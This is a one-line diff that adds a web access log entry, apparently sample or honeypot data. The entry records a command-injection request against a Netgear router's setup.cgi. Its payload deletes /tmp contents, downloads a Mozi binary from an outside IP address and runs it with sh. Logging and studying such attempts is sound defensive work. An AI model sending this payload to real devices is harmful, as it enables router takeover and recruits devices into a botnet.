@@ -1,0 +1,1 @@
+[30/Dec/2021:10:49:33 +0800] <3863768> 127.0.0.1 "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://218.72.43.169:60846/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 0.000782 232 -" "-"
